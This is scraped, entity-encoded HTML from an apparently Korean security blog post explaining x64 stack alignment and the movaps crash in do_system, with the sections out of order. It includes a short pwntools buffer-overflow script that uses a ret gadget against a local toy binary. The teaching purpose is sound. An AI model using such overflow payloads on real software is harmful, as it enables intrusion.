&lt;h1 id=&#34;RET-sled&#34;&gt;&lt;a href=&#34;#RET-sled&#34; class=&#34;headerlink&#34; title=&#34;RET sled&#34;&gt;&lt;/a&gt;RET sled&lt;/h1&gt;&lt;p&gt;&amp;#xC9C0;&amp;#xAE08;&amp;#xAE4C;&amp;#xC9C0; &amp;#xC124;&amp;#xBA85;&amp;#xD55C; &amp;#xB0B4;&amp;#xC6A9;&amp;#xC744; &amp;#xC774;&amp;#xD574;&amp;#xD558;&amp;#xC168;&amp;#xB2E4;&amp;#xBA74; &amp;#xC55E;&amp;#xC73C;&amp;#xB85C; &amp;#xACF5;&amp;#xACA9; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xC9DC;&amp;#xC2E4; &amp;#xB54C; &amp;#xC544;&amp;#xBB34; &amp;#xBB38;&amp;#xC81C;&amp;#xC5C6;&amp;#xC744; &amp;#xAC70;&amp;#xB77C; &amp;#xC0DD;&amp;#xAC01;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB798;&amp;#xB3C4; &amp;#xC5EC;&amp;#xAE30;&amp;#xC11C; &amp;#xAE00;&amp;#xC744; &amp;#xB9C8;&amp;#xBB34;&amp;#xB9AC; &amp;#xC9D3;&amp;#xAE34; &amp;#xC560;&amp;#xB9E4;&amp;#xD558;&amp;#xB2C8; &amp;#xD574;&amp;#xACB0; &amp;#xBC29;&amp;#xBC95;&amp;#xC744; &amp;#xC54C;&amp;#xC544;&amp;#xBCF4;&amp;#xC8E0;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;#bof2.py&lt;/span&gt;

&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt;*

p = process(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;./vuln&amp;apos;&lt;/span&gt;)

win = &lt;span class=&#34;hljs-number&#34;&gt;0x401156&lt;/span&gt;
ret = &lt;span class=&#34;hljs-number&#34;&gt;0x40119a&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;# ret sled&lt;/span&gt;

payload = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;apos;A&amp;apos;&lt;/span&gt;*&lt;span class=&#34;hljs-number&#34;&gt;24&lt;/span&gt; + p64(ret) + p64(win)

p.sendline(payload)
p.interactive()&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/21.png&#34; alt&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;$ python3 bof2.py&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xB124;. &amp;#xC815;&amp;#xB9D0; &amp;#xBCC4;&amp;#xAC70; &amp;#xC5C6;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. ret &amp;#xAC00;&amp;#xC82F;&amp;#xC744; &amp;#xD558;&amp;#xB098; &amp;#xB354; &amp;#xCD94;&amp;#xAC00;&amp;#xD574;&amp;#xC11C; RSP&amp;#xC758; &amp;#xC704;&amp;#xCE58;&amp;#xB97C; 8&amp;#xB9CC;&amp;#xD07C; &amp;#xC870;&amp;#xC815;&amp;#xD574;&amp;#xC8FC;&amp;#xBA74; BOF &amp;#xACF5;&amp;#xACA9;&amp;#xC744; &amp;#xD560; &amp;#xB54C; stack alignment&amp;#xB97C; &amp;#xC720;&amp;#xC9C0;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB108;&amp;#xBB34; &amp;#xB2E8;&amp;#xC21C;&amp;#xD558;&amp;#xACE0; &amp;#xB2F9;&amp;#xC5F0;&amp;#xD574;&amp;#xC11C; &amp;#xB354; &amp;#xC124;&amp;#xBA85;&amp;#xD560; &amp;#xAC8C; &amp;#xC5C6;&amp;#xB124;&amp;#xC694;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/22.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC9E0;!&lt;/p&gt;
&lt;h1 id=&#34;&amp;#xB9C8;&amp;#xCE58;&amp;#xBA70;&#34;&gt;&lt;a href=&#34;#&amp;#xB9C8;&amp;#xCE58;&amp;#xBA70;&#34; class=&#34;headerlink&#34; title=&#34;&amp;#xB9C8;&amp;#xCE58;&amp;#xBA70;&#34;&gt;&lt;/a&gt;&amp;#xB9C8;&amp;#xCE58;&amp;#xBA70;&lt;/h1&gt;&lt;p&gt;RET sled &amp;#xB9D0;&amp;#xACE0;&amp;#xB3C4; stack alignment&amp;#xB97C; &amp;#xC720;&amp;#xC9C0;&amp;#xD558;&amp;#xBA74;&amp;#xC11C; ROP &amp;#xD558;&amp;#xB294; &amp;#xBC29;&amp;#xBC95;&amp;#xC740; &amp;#xB9CE;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC0AC;&amp;#xC2E4; &amp;#xD55C; &amp;#xAC00;&amp;#xC9C0; &amp;#xBC29;&amp;#xBC95; &amp;#xB354; &amp;#xBCF4;&amp;#xC5EC;&amp;#xB4DC;&amp;#xB9AC;&amp;#xB824;&amp;#xACE0; &amp;#xD588;&amp;#xB294;&amp;#xB370; &amp;#xADF8;&amp;#xAC74; endbr64&amp;#xB791; CET&amp;#xAE4C;&amp;#xC9C0; &amp;#xC124;&amp;#xBA85;&amp;#xD574;&amp;#xC57C; &amp;#xB3FC;&amp;#xC11C; &amp;#xAE30;&amp;#xD68C;&amp;#xAC00; &amp;#xB418;&amp;#xBA74; &amp;#xB530;&amp;#xB85C; &amp;#xAE00;&amp;#xC744; &amp;#xC791;&amp;#xC131;&amp;#xD558;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/23.png&#34; alt&gt;&lt;/p&gt;
 - hack &amp; life">
  <meta name="author" content="j0dev, y2sman">
  <meta name="keywords" content>
  <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
  <meta name="naver-site-verification" content="0b4fea742ed293b82621684e466d9f26c3ccee06">


  <meta property="og:type" content="website"> 
  <meta property="og:title" content="[Research] x64 stack alignment - hackyboiz">
  <meta property="og:description" content="&lt;h1 id=&#34;&amp;#xBA38;&amp;#xB9BF;&amp;#xB9D0;&#34;&gt;&lt;a href=&#34;#&amp;#xBA38;&amp;#xB9BF;&amp;#xB9D0;&#34; class=&#34;headerlink&#34; title=&#34;&amp;#xBA38;&amp;#xB9BF;&amp;#xB9D0;&#34;&gt;&lt;/a&gt;&amp;#xBA38;&amp;#xB9BF;&amp;#xB9D0;&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/1.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xBE44;&amp;#xBC00; &amp;#xD504;&amp;#xB85C;&amp;#xC81D;&amp;#xD2B8;( &amp;#xC544;&amp;#xC9C1; &amp;#xBE44;&amp;#xBC00;, &amp;#xC27F;! ) &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; Ubuntu 20.04&amp;#xC5D0;&amp;#xC11C; &amp;#xBA87; &amp;#xAC00;&amp;#xC9C0; &amp;#xD14C;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB97C; &amp;#xD558;&amp;#xB2E4;&amp;#xAC00; &amp;#xCC98;&amp;#xC74C; &amp;#xBCF4;&amp;#xB294; &amp;#xC5D0;&amp;#xB7EC;&amp;#xC5D0; &amp;#xB2F9;&amp;#xD669;&amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;do_system+364: movaps&lt;/code&gt; &amp;#xC778;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB7ED;&amp;#xC158;&amp;#xC5D0;&amp;#xC11C; Segmentation Fault&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB354;&amp;#xB77C;&amp;#xACE0;&amp;#xC694;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/2.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC54C;&amp;#xC544;&amp;#xBCF4;&amp;#xB2C8;&amp;#xAE4C; Ubuntu 18.04&amp;#xBD80;&amp;#xD130; &lt;code&gt;do_system()&lt;/code&gt;&amp;#xC5D0; &lt;code&gt;movaps&lt;/code&gt;&amp;#xC778;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB7ED;&amp;#xC158;&amp;#xC774; &amp;#xD558;&amp;#xB098; &amp;#xCD94;&amp;#xAC00;&amp;#xB410;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC870;&amp;#xAE08; &amp;#xB4A4;&amp;#xC5D0; &amp;#xC790;&amp;#xC138;&amp;#xD788; &amp;#xC124;&amp;#xBA85;&amp;#xD558;&amp;#xACA0;&amp;#xC9C0;&amp;#xB9CC;, x64 &amp;#xB9AC;&amp;#xB205;&amp;#xC2A4;&amp;#xC5D0;&amp;#xC120; 16&amp;#xBC14;&amp;#xC774;&amp;#xD2B8;&amp;#xB85C; stack alignment&amp;#xB97C; &amp;#xC9C0;&amp;#xCF1C;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. stack alignment&amp;#xAC00; &amp;#xAE68;&amp;#xC838;&amp;#xC788;&amp;#xC73C;&amp;#xBA74; &amp;#xC774; &amp;#xC778;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB7ED;&amp;#xC158;&amp;#xC744; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xB2E4; Segmentation Fault&amp;#xAC00; &amp;#xB739;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xB188; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; 18.04 &amp;#xC774;&amp;#xC804; &amp;#xBC84;&amp;#xC804;&amp;#xC5D0;&amp;#xC11C; &amp;#xC775;&amp;#xC2A4; &amp;#xB418;&amp;#xB294; BOF &amp;#xACF5;&amp;#xACA9;&amp;#xCF54;&amp;#xB4DC;&amp;#xAC00; 18.04 &amp;#xC774;&amp;#xD6C4; &amp;#xBC84;&amp;#xC804;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xC218; &amp;#xC5C6;&amp;#xB294; &amp;#xACBD;&amp;#xC6B0;&amp;#xB3C4; &amp;#xC788;&amp;#xB2E4;&amp;#xACE0; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/3.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&amp;#x6545; Fabu1ous&amp;#xC758; &amp;#xB124;&amp;#xC774;&amp;#xBC84; &amp;#xBE14;&amp;#xB85C;&amp;#xADF8; (2018.10 ~ 2019.12)&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC9C0;&amp;#xAE08;&amp;#xAE4C;&amp;#xC9C0; &amp;#xD47C; &amp;#xD3EC;&amp;#xB108;&amp;#xBE14; &amp;#xBB38;&amp;#xC81C;&amp;#xB9CC; &amp;#xBC31;&amp;#xBA87; &amp;#xAC1C;&amp;#xCBE4; &amp;#xB418;&amp;#xACE0; &amp;#xC218;&amp;#xC5C6;&amp;#xC774; &amp;#xB9CE;&amp;#xC740; &lt;code&gt;system(&amp;quot;/bin/sh&amp;quot;)&lt;/code&gt;&amp;#xC744; &amp;#xD638;&amp;#xCD9C;&amp;#xD574; &amp;#xBD24;&amp;#xB294;&amp;#xB370; &amp;#xC5B4;&amp;#xC9F8;&amp;#xC11C; &amp;#xC774; &amp;#xC0AC;&amp;#xC2E4;&amp;#xC744; &amp;#xC774;&amp;#xC81C;&amp;#xC57C; &amp;#xC54C;&amp;#xAC8C; &amp;#xB41C; &amp;#xAC70;&amp;#xC9C0;?&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/4.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC791;&amp;#xB144;(2019) &amp;#xD06C;&amp;#xB9AC;&amp;#xC2A4;&amp;#xB9C8;&amp;#xC2A4; CTF&amp;#xC5D0;&amp;#xC11C; &amp;#xB2E8;&amp;#xC21C; ROP&amp;#xBB38;&amp;#xC81C;&amp;#xB97C; &amp;#xC775;&amp;#xC2A4; &amp;#xBABB;&amp;#xD574;&amp;#xC11C; &amp;#xD654;&amp;#xB0AC;&amp;#xB358; &amp;#xAE30;&amp;#xC5B5;&amp;#xC774; &amp;#xBA38;&amp;#xB9AC;&amp;#xB97C; &amp;#xC2A4;&amp;#xCE58;&amp;#xACE0; &amp;#xC9C0;&amp;#xB098;&amp;#xAC14;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBD84;&amp;#xBA85; &amp;#xB85C;&amp;#xCEEC;&amp;#xC5D0;&amp;#xC120; &amp;#xC775;&amp;#xC2A4;&amp;#xAC00; &amp;#xB418;&amp;#xB358; &amp;#xAC8C; &amp;#xB9AC;&amp;#xBAA8;&amp;#xD2B8; &amp;#xC775;&amp;#xC2A4;&amp;#xAC00; &amp;#xC548;&amp;#xB3FC;&amp;#xC11C; &amp;#xD300;&amp;#xC6D0;&amp;#xC5D0;&amp;#xAC8C; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xB118;&amp;#xACA8;&amp;#xC8FC;&amp;#xACE0; &amp;#xB2E4;&amp;#xB978; &amp;#xBB38;&amp;#xC81C; &amp;#xBCF4;&amp;#xB7EC; &amp;#xAC14;&amp;#xC5C8;&amp;#xC8E0;. &amp;#xADF8;&amp;#xB54C; &amp;#xBABB; &amp;#xD480;&amp;#xC5C8;&amp;#xB358; ROP&amp;#xBB38;&amp;#xC81C;&amp;#xB294; solo_test&amp;#xB780; &amp;#xBB38;&amp;#xC81C;&amp;#xC600;&amp;#xB294;&amp;#xB370; &amp;#xADF8;&amp;#xB54C; &amp;#xB85C;&amp;#xCEEC; &amp;#xD658;&amp;#xACBD;&amp;#xC774; &amp;#xC6B0;&amp;#xBD84;&amp;#xD22C; 16.04&amp;#xC600;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&amp;#x2026; &amp;#xD6C4;&amp;#x2026;&lt;/p&gt;
&lt;p&gt;&amp;#xB300;&amp;#xD68C; &amp;#xB05D;&amp;#xB098;&amp;#xACE0; &amp;#xBC14;&amp;#xB85C; &amp;#xBA70;&amp;#xCE60; &amp;#xB4A4;&amp;#xC5D0; &amp;#xC774; &amp;#xC8FC;&amp;#xC81C;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xB77C;&amp;#xC5C5;&amp;#xC774; &amp;#xD558;&amp;#xB098; &amp;#xC62C;&amp;#xB77C;&amp;#xC654;&amp;#xB294;&amp;#xB370; 1&amp;#xB144;&amp;#xC774; &amp;#xC9C0;&amp;#xB09C; &amp;#xC9C0;&amp;#xAE08;&amp;#xC5D0;&amp;#xC11C;&amp;#xC57C; &amp;#xCC3E;&amp;#xC544;&amp;#xBCF8; &amp;#xC81C; &amp;#xC790;&amp;#xC2E0;&amp;#xC774; &amp;#xB108;&amp;#xBB34; &amp;#xBC09;&amp;#xB124;&amp;#xC694;. ROP&amp;#xBB38;&amp;#xC81C;&amp;#xB77C;&amp;#xACE0; &amp;#xB300;&amp;#xC218;&amp;#xB86D;&amp;#xC9C0; &amp;#xC54A;&amp;#xAC8C; &amp;#xADF8;&amp;#xB0E5; &amp;#xB118;&amp;#xACA8;&amp;#xBC84;&amp;#xB9B0; &amp;#xAC83;&amp;#xC5D0; &amp;#xBC18;&amp;#xC131;&amp;#xD558;&amp;#xBA70; &amp;#xC9C0;&amp;#xAE08;&amp;#xC774;&amp;#xB77C;&amp;#xB3C4; &amp;#xACF5;&amp;#xBD80;&amp;#xD574;&amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;#xB2A6;&amp;#xC5C8;&amp;#xB2E4;&amp;#xACE0; &amp;#xC0DD;&amp;#xAC01;&amp;#xD560; &amp;#xB54C;&amp;#xAC00; &amp;#xC9C4;&amp;#xC9DC; &amp;#xB108;&amp;#xBB34; &amp;#xB2A6;&amp;#xC5C8;&amp;#xB2E4; -&amp;#xBC15;&amp;#xBA85;&amp;#xC218;-&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;x64-Stack-Alignment&#34;&gt;&lt;a href=&#34;#x64-Stack-Alignment&#34; class=&#34;headerlink&#34; title=&#34;x64 Stack Alignment&#34;&gt;&lt;/a&gt;x64 Stack Alignment&lt;/h1&gt;&lt;p&gt;stack alignment&amp;#xB294; stack&amp;#xC758; top&amp;#xC774; 16&amp;#xC758; &amp;#xBC30;&amp;#xC218;&amp;#xB85C; &amp;#xC720;&amp;#xC9C0;&amp;#xB41C; &amp;#xC0C1;&amp;#xD0DC;&amp;#xBA70; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC758; access cycle&amp;#xC744; &amp;#xCD5C;&amp;#xC18C;&amp;#xD55C;&amp;#xC73C;&amp;#xB85C; &amp;#xC904;&amp;#xC774;&amp;#xAE30; &amp;#xC704;&amp;#xD574; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. ( CS&amp;#xB97C; &amp;#xACF5;&amp;#xBD80;&amp;#xD558;&amp;#xB2E4;&amp;#xAC00; &amp;#x201C;&amp;#xC65C;?&amp;#x201D;&amp;#xB77C;&amp;#xB294; &amp;#xC9C8;&amp;#xBB38;&amp;#xC744; &amp;#xB358;&amp;#xC9C0;&amp;#xBA74; &amp;#xC2ED;&amp;#xC911;&amp;#xD314;&amp;#xAD6C; &amp;#x201C;&amp;#xD6A8;&amp;#xC728;&amp;#x201D;&amp;#xC774;&amp;#xB77C;&amp;#xB294; &amp;#xB300;&amp;#xB2F5;&amp;#xC774; &amp;#xB3CC;&amp;#xC544;&amp;#xC634;, &amp;#xB354; &amp;#xC790;&amp;#xC138;&amp;#xD55C; &amp;#xAC74; &amp;#xC9C1;&amp;#xC811; &amp;#xCC3E;&amp;#xC544;&amp;#xBCF4;&amp;#xC2DC;&amp;#xAE38; ) &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xC774; stack alignment&amp;#xB97C; &amp;#xC720;&amp;#xC9C0;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574; RSP&amp;#xC758; &amp;#xC704;&amp;#xCE58;&amp;#xAC00; &amp;#xC815;&amp;#xD574;&amp;#xC9C0;&amp;#xB294; &amp;#xADDC;&amp;#xCE59;&amp;#xC774; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/5.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;Linux 64 &lt;a href=&#34;https://software.intel.com/sites/default/files/article/402129/mpx-linux64-abi.pdf&#34;&gt;ABI&lt;/a&gt;( Application binary interface )&amp;#xC5D0; &amp;#xB530;&amp;#xB974;&amp;#xBA74; &amp;#xD504;&amp;#xB85C;&amp;#xADF8;&amp;#xB7A8;&amp;#xC758; &amp;#xD750;&amp;#xB984;( control )&amp;#xC774; &amp;#xD568;&amp;#xC218;&amp;#xC758; entry&amp;#xB85C; &amp;#xC62E;&amp;#xACA8;&amp;#xC9C0;&amp;#xB294; &amp;#xC2DC;&amp;#xC810;&amp;#xC5D0;&amp;#xC120; &amp;#xC2A4;&amp;#xD0DD; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;(rsp)+8&amp;#xC774; &amp;#xD56D;&amp;#xC0C1; 16&amp;#xC758; &amp;#xBC30;&amp;#xC218;&amp;#xC5EC;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/6.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xBC29;&amp;#xAE08; &amp;#xC804;&amp;#xC5D4; RSP&amp;#xB97C; 16&amp;#xC758; &amp;#xBC30;&amp;#xC218;&amp;#xB85C; &amp;#xC720;&amp;#xC9C0;&amp;#xD558;&amp;#xB294; &amp;#xAC8C; stack alignment&amp;#xB77C; &amp;#xD574;&amp;#xB193;&amp;#xACE0; &amp;#xAC11;&amp;#xC790;&amp;#xAE30; RSP+8&amp;#xC774; 16&amp;#xC758; &amp;#xBC30;&amp;#xC218;&amp;#xB77C;&amp;#xB2C8;, &amp;#xBB50;&amp;#xB77C;&amp;#xB294; &amp;#xAC70;&amp;#xC57C;?&lt;/p&gt;
&lt;p&gt;&amp;#xBB34;&amp;#xC2A8; &amp;#xC18C;&amp;#xB9B0;&amp;#xC9C0; &amp;#xBAA8;&amp;#xB974;&amp;#xACA0;&amp;#xC8E0;? &amp;#xC124;&amp;#xBA85;&amp;#xC774; &amp;#xBB50; &amp;#xAC19;&amp;#xC774; &amp;#xC4F0;&amp;#xC5EC;&amp;#xC788;&amp;#xC5B4;&amp;#xC11C; &amp;#xADF8;&amp;#xB807;&amp;#xC9C0; &amp;#xC0AC;&amp;#xC2E4; &amp;#xC544;&amp;#xC8FC; &amp;#xAC04;&amp;#xB2E8;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// test.c&lt;/span&gt;

&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;hello&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;hello stack alignment\\n&amp;quot;&lt;/span&gt;);
}

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
	hello();
	
	&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
}&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;$ gcc -o &lt;span class=&#34;hljs-built_in&#34;&gt;test&lt;/span&gt; test.c -no-pie
$ gdb -q &lt;span class=&#34;hljs-built_in&#34;&gt;test&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xAC04;&amp;#xB2E8;&amp;#xD55C; &amp;#xC608;&amp;#xC81C;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xD655;&amp;#xC778;&amp;#xD574;&amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;. &amp;#xB514;&amp;#xBC84;&amp;#xAE45;&amp;#xD560; &amp;#xB54C; &amp;#xAC70;&amp;#xC2AC;&amp;#xB9AC;&amp;#xB2C8; PIE&amp;#xB294; &amp;#xD574;&amp;#xC81C;&amp;#xD558;&amp;#xACE0; &amp;#xCEF4;&amp;#xD30C;&amp;#xC77C;&amp;#xD558;&amp;#xC138;&amp;#xC694;. &amp;#xC800;&amp;#xB294; Ubuntu 20.04&amp;#xC640; glibc-2.31&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/7.png&#34; alt&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;pwndbg&amp;gt; bp main&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/8.png&#34; alt&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;pwndbg&amp;gt; r&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC815;&amp;#xC0C1;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xD638;&amp;#xCD9C;&amp;#xB41C; &lt;code&gt;main()&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC758; entry point&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC544;&amp;#xC9C1; &amp;#xD504;&amp;#xB864;&amp;#xB85C;&amp;#xADF8;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xAE30; &amp;#xC804;&amp;#xC774;&amp;#xB2C8; RSP+8&amp;#xC740; 16&amp;#xC758; &amp;#xBC30;&amp;#xC218;&amp;#xACA0;&amp;#xC8E0;?&lt;/p&gt;
&lt;p&gt;RSP : &lt;code&gt;0x7fffffffe038&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;RSP+8 : &lt;code&gt;0x7fffffffe040&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC704; &amp;#xC2A4;&amp;#xD06C;&amp;#xB9B0;&amp;#xC0F7;&amp;#xC744; &amp;#xBCF4;&amp;#xBA74; RSP+8&amp;#xC740; &lt;code&gt;0x7fffffffe040&lt;/code&gt;&amp;#xC774;&amp;#xBBC0;&amp;#xB85C; 16&amp;#xC758; &amp;#xBC30;&amp;#xC218;&amp;#xAC00; &amp;#xB9DE;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/9.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB7FC; &amp;#xB2E4;&amp;#xB4E4; &amp;#xC54C;&amp;#xB2E4;&amp;#xC2DC;&amp;#xD53C; call &amp;#xC778;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB7ED;&amp;#xC158;&amp;#xC73C;&amp;#xB85C; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xBA74; stack&amp;#xC5D0; return address&amp;#xB97C; push &amp;#xD558;&amp;#xB2C8;&amp;#xAE4C; call &amp;#xC778;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB7ED;&amp;#xC158;&amp;#xC744; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xAE30; &amp;#xC9C1;&amp;#xC804;&amp;#xC5D4; RSP&amp;#xAC00; 16&amp;#xC758; &amp;#xBC30;&amp;#xC218;&amp;#xACA0;&amp;#xC8E0;?&lt;/p&gt;
&lt;p&gt;RSP : &lt;code&gt;0x7fffffffe030&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2020/12/06/fabu1ous/x64-stack-alignment/10.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xD568;&amp;#xC218; &amp;#xD504;&amp;#xB864;&amp;#xB85C;&amp;#xADF8;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;push rbp&lt;/code&gt;&amp;#xB97C; &amp;#xD558;&amp;#xB2C8;&amp;#xAE4C; rbp&amp;#xB294; &amp;#xD56D;&amp;#xC0C1; 16&amp;#xC758; &amp;#xBC30;&amp;#xC218;&amp;#xACA0;&amp;#xB124;&amp;#xC694;?&lt;/p&gt;
&lt;p&gt;RSP : &lt;code&gt;0x7ffffffffdfe0&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xB300;&amp;#xCDA9; &amp;#xC815;&amp;#xB9AC;&amp;#xD574;&amp;#xBCF4;&amp;#xBA74; stack align&amp;#xC744; &amp;#xC9C0;&amp;#xD0A4;&amp;#xBA74;&amp;#xC11C; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &amp;#xD750;&amp;#xB984;&amp;#xC740; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;ol&gt;
